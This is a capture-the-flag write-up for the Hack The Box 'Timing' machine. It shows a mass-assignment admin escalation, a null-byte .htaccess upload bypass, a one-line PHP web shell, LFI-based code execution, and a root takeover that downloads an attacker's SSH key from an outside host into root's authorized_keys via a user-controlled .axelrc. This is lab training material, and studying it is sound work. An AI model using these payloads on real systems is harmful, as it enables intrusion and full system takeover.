HTB Timing

Box: Timing (Medium)
IP: 10.129.94.82
OS: Ubuntu, Apache/2.4.29
Stack: PHP, MySQL

Web Enumeration

Found a PHP login form at `/login.php`. Tried SQLi, NoSQL injection, timing-based username enumeration. Used Burp Suite to intercept requests and analyze the application.

After logging in (or finding creds), discovered an "Edit profile" page that POSTs to `profile_update.php` with parameters: `firstName`, `lastName`, `email`, `company`.

Mass Assignment (Privilege Escalation to Admin)

The response from `profile_update.php` returned all user fields including `"role": "0"`. This field wasn't in the form but was visible in the JSON response.

Added `&role=1` to the POST body in Burp Repeater:

    firstName=test&lastName=test&email=test&company=test&role=1

The server accepted it and changed the role to `"1"` — admin. This is a mass assignment vulnerability: the backend updates all parameters sent without checking which ones the user is allowed to modify (OWASP API3: Broken Object Property Level Authorization).

Lesson: whenever you see access control fields (role, admin, isAdmin, privilege) in a response that aren't in the form, try injecting them back in the request.

File Upload

With admin access, found an avatar upload page at `avatar_uploader.php`. The upload validates file extensions (whitelist).

Attempted `.htaccess` upload to make Apache execute `.jpg` files as PHP. Direct `.htaccess` upload was blocked by extension filter. Used null byte bypass: `filename=".htaccess%00.jpg"` which uploaded successfully.

Content of `.htaccess`:

    AddType application/x-httpd-php .jpg

Then uploaded `shell.jpg` containing PHP code:

    <?php system($_GET['cmd']); ?>

The server renames uploaded files using MD5 hash of filename + timestamp, making them hard to find. Used a Python script to brute force the hashed filename by trying timestamps backward from upload time.

LFI via image.php

Found `image.php` which loads images via `img` parameter. Used this to access the uploaded shell:

    http://10.129.94.10/image.php?img=images/uploads/<md5hash>_shell.jpg&cmd=id

Got RCE as www-data.

Source Code Review

Downloaded source files backup (`source-files-backup.zip`). Found database credentials and application logic that revealed the file naming scheme and other internals.

Lateral Movement to Aaron

Found credentials in the source code. SSH'd in as aaron.

Privilege Escalation: Aaron to Root (axelrc Abuse)

`sudo -l` showed aaron can run `/usr/bin/netutils` as root without a password.

netutils is an interactive tool that uses axel to download files via HTTP/FTP. axel reads its config from `~/.axelrc` in the calling user's home directory. The `default_filename` setting controls where downloaded files are saved — but only when the URL has no filename in it.

Attack chain:

Step 1: Generate SSH keys on Kali

    ssh-keygen -t rsa -f timing_rsa

Step 2: Create a custom Python HTTP server that serves `timing_rsa.pub` at the root path `/` (no filename in URL)

    import http.server
    import socketserver

    class MyHttpRequestHandler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            if self.path == '/':
                self.path = 'timing_rsa.pub'
            return http.server.SimpleHTTPRequestHandler.do_GET(self)

    handler_object = MyHttpRequestHandler
    PORT = 1337
    my_server = socketserver.TCPServer(("", PORT), handler_object)
    my_server.serve_forever()

Why a custom server? A normal `python3 -m http.server` would serve the file at `http://IP:1337/timing_rsa.pub`. axel sees the filename in the URL and uses that as the save name, ignoring `.axelrc`. The custom server serves the file at just `/` so there's no filename in the URL, forcing axel to use `default_filename` from `.axelrc`.

Step 3: On the box as aaron, create `.axelrc` to redirect downloads to root's authorized_keys

    echo 'default_filename = /root/.ssh/authorized_keys' > ~/.axelrc

Step 4: Run netutils as root and download

    sudo /usr/bin/netutils
    Select: HTTP
    URL: http://10.10.14.100:1337/

axel reads aaron's `.axelrc`, sees `default_filename = /root/.ssh/authorized_keys`, and since it's running as root it can write there. Our public key overwrites root's authorized_keys.

Step 5: SSH as root

    ssh -i timing_rsa root@10.129.94.82

The vulnerability: a root-level tool trusts a user-controlled config file (`.axelrc`) for its output path. Aaron can't write to `/root/.ssh/` directly, but he can trick a root-owned process into doing it for him.

Gotchas

axel appends `.1`, `.2` etc if the target file already exists. If this happens, reset the box and do the download on a clean `/root/.ssh/` directory.

The first attempt used ED25519 keys which may not work with older OpenSSH (7.6). RSA keys are safer for compatibility.

Key Takeaways

1. Mass assignment: always check for hidden fields in API responses and try injecting them back
2. Null byte bypass: `filename.htaccess%00.jpg` can bypass extension filters on older PHP versions
3. File upload naming: servers often rename uploads with hashes — check source code or LFI to find the naming scheme
4. axelrc abuse: when a privileged tool reads config from a user-controlled location, the user controls where output goes
5. Custom HTTP servers: sometimes you need to control exactly how a file is served, not just that it's served
6. authorized_keys overwrite: classic privesc pattern — if you can write to root's SSH config, you own the box
